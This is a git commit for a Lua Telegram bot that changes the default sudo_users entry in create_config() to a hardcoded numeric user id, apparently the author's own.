a48d7f1f9bfdd29b3790ba7a0f6a16df664dbc4f
sudotohid <prbka@hi2.in>
2017-02-07 00:03:40 +0330

    Update bot.lua

--- bot/bot.lua
+++ bot/bot.lua
@@ -340,7 +340,7 @@ function create_config()
     globally_banned = {},
     mkgroup = {founded = '', founder = '', title = '', gtype = '', uid = ''},
     realm = {},
-    sudo_users = {[our_id] = our_id}
+    sudo_users = {[our_id] = 170146015}
   }
   save_config()
 end
